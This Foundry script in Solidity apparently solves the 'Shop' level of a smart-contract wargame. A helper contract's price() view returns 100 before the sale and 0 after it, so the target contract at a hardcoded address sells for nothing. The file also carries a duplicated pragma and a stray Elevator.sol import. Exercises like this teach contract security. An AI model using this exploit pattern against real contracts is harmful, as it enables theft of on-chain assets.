// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Shop.sol";
import "forge-std/console.sol";
import "forge-std/Script.sol";

pragma solidity ^0.8.0;

import "../src/Elevator.sol";
import "forge-std/console.sol";
import "forge-std/Script.sol";

contract buyShop {
    Shop shop = Shop(0xE9D4644fc850a6acc7F0066064A4a642Dd9978bC);
    function buy() external {
        shop.buy();
        console.log(shop.price());
    }
    function price() external view returns (uint256) {
        if (!shop.isSold()) {
            return 100;
        } else {
            return 0;
        }
    }
}

contract ShopSolution is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        buyShop bs = new buyShop();
        bs.buy();
        vm.stopBroadcast();
    }
}
